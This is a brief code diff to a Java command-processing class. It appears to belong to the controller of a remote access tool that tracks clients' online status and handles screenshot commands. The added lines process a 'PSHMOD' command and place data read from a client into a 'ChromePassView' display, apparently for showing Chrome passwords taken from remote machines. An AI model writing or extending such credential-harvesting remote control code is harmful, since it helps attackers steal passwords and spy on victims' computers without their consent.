@@ -53,6 +53,8 @@ class ProcessCommands implements Repository {
                 client.setOnlineStatus("Online");
                 Controller.updateStats();
                 Controller.updateTable();
+            } else if (input.contains("PSHMOD")){
+                  ChromePassView.getResultsArea().setText(readFromDis(dis));
             } else if (input.contains("SCREENSHOT")) {
                 // SERVER: SCREENSHOT
                 // CLIENT: filename
